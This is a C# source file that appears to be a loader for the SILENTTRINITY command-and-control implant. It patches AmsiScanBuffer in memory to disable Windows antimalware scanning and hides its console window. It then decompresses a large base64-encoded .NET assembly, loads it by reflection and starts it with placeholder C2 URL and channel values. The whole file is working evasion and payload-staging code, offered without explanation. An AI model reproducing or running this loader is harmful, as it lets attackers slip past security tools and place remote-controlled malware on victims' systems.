using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Reflection;
using System.IO.Compression;
using System.IO;
using System.Runtime.InteropServices;

namespace SilentTrinityExe
{


    public class Amsi

    {
        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string dllName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);

        [DllImport("kernel32.dll", SetLastError = true)]
        internal static extern bool VirtualProtect(IntPtr address, uint size, uint newProtect, out IntPtr oldProtect);
        public static string Run()
        {
            IntPtr dllHandle = LoadLibrary("amsi.dll"); //load the amsi.dll
            if (dllHandle == null)
            {
                return "error";
            }
            else
            {
                Console.WriteLine("\n\n\n[*] Amsi.Dll Has Been Loaded");
            }


            //Get the AmsiScanBuffer function address
            IntPtr AmsiScanbufferAddr = GetProcAddress(dllHandle, "AmsiScanBuffer");



            IntPtr OldProtection = Marshal.AllocHGlobal(4); //pointer to store the current AmsiScanBuffer memory protection

            //Pointer changing the AmsiScanBuffer memory protection from readable only to writeable (0x40)
            bool VirtualProtectRc = VirtualProtect(AmsiScanbufferAddr, 0x0015, 0x40, out OldProtection);
            if (VirtualProtectRc == false)
            {
                return "error";
            }
            else
            {
                Console.WriteLine("[*] Changing AmsiScanBuffer Memory protection to Writable : " + VirtualProtectRc);
            }

            //The new patch opcode
            var patch = new byte[] { 0x31, 0xff, 0x90 };

            //Setting a pointer to the patch opcode array (unmanagedPointer)
            IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
            Marshal.Copy(patch, 0, unmanagedPointer, 3);

            //Patching the relevant line (the line which submits the rd8 to the edi register) with the xor edi,edi opcode
            MoveMemory(AmsiScanbufferAddr + 0x001b, unmanagedPointer, 3);
            return "OK";
        }


    }
    class Program
    {

            [DllImport("kernel32.dll")]
            static extern IntPtr GetConsoleWindow();

            [DllImport("user32.dll")]
            static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
            public static void Main(string[] args)
            {
               run();
            }
            public static void run()
            {
                Amsi.Run();


                string url = "C2_URL";
                string channel = "C2_CHANNEL";

                var handle = GetConsoleWindow();

                ShowWindow(handle, 0);
                string b64 = "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";
                object[] test = new object[] { new string[] { url, channel } };
                byte[] compressed = System.Convert.FromBase64String(b64);
                using (MemoryStream inputStream = new MemoryStream(compressed.Length))
                {
                    inputStream.Write(compressed, 0, compressed.Length);
                    inputStream.Seek(0, SeekOrigin.Begin);
                    using (MemoryStream outputStream = new MemoryStream())
                    {
                        using (DeflateStream deflateStream = new DeflateStream(inputStream, CompressionMode.Decompress))
                        {
                            byte[] buffer = new byte[4096];
                            int bytesRead;
                            while ((bytesRead = deflateStream.Read(buffer, 0, buffer.Length)) != 0)
                            {
                                outputStream.Write(buffer, 0, bytesRead);
                            }
                        }
                        Assembly a = Assembly.Load(outputStream.ToArray());
                        Type t = a.GetType("ST");
                        object classInstance = Activator.CreateInstance(t, null);
                        MethodInfo methodInfo = t.GetMethod("main");
                        methodInfo.Invoke(classInstance, new object[] { url, channel });
                    }
                }

            }
        }
    }
}

